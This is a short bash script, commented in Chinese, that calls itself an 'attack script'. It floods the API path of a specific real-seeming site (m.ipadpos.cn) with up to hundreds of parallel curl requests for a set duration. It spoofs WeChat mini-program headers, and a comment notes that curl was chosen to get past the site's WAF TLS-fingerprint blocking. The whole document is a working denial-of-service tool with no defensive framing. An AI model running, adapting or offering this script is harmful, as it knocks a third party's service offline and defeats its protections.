#!/usr/bin/env bash
# 半日轻食 / 千策万划 打击脚本 —— 必须用 curl（python 会被 WAF 按 TLS 指纹拦）
# 用法: bash attack.sh <并发> <时长秒> [接口路径]
set -u
CONC="${1:-100}"
DUR="${2:-600}"
PATHX="${3:-/channelApi/goods}"
UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003123) NetType/WIFI Language/zh_CN"
HOST="https://m.ipadpos.cn"
END=$((SECONDS + DUR))

URLS=()
for i in $(seq 1 "$CONC"); do URLS+=("${HOST}${PATHX}"); done

echo "[start] conc=$CONC dur=$DUR path=$PATHX"
ROUND=0
while [ $SECONDS -lt $END ]; do
  ROUND=$((ROUND + 1))
  EXIT=$(curl -sS -k --parallel --parallel-max "$CONC" --max-time 40 \
    -H "User-Agent: $UA" -H "appType: mini" -H "uniacid: 3" -H "module: yb_wm_v3" \
    -H "Accept: */*" \
    -o /dev/null -w "%{http_code} %{time_total}\n" "${URLS[@]}" 2>&1 | \
    awk '{c[$1]++; s+=$2; if($2>m)m=$2} END {printf "codes:"; for(k in c) printf " %s=%d", k, c[k]; printf " | avg=%.2fs max=%.2fs", s/NR, m}')
  echo "[${SECONDS}s] round=$ROUND $EXIT"
done
echo "[done] rounds=$ROUND"
